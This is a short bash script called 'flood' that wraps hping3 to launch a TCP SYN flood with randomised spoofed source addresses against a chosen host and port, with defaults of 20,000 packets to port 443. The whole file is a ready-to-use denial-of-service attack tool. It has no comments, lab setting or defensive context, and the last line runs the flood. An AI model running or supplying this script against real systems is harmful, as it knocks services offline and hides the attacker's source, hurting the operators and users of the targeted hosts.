#!/bin/bash

usage() {
  echo "Usage: ./flood [-p port] [-s packet size] [-c packet count] [-w window size] -h host"
  echo "  options:"
  echo "    -p --port               port         [default: 443] "
  echo "    -s --size               packet size  [default: 120] "
  echo "    -c --count packet       count        [default: 20000]"
  echo "    -w --window_size        window size  [default: 64]"
  echo "    -h --host               host"
  echo ""
  exit
}


if [ $# -eq 0 ]
  then
    usage
fi


PORT=443
SIZE=120
PACKETS=20000
WINSIZE=64

while getopts w:p:s:c:h: flag
do
   case "${flag}" in
      w) WINSIZE=${OPTARG};;
      p) PORT=${OPTARG};;
      s) SIZE=${OPTARG};;
      c) PACKETS=${OPTARG};;
      h) HOST=${OPTARG};;
   esac
done

hping3 -c $PACKETS -d $SIZE -S -w $WINSIZE -p $PORT --flood --rand-source $HOST
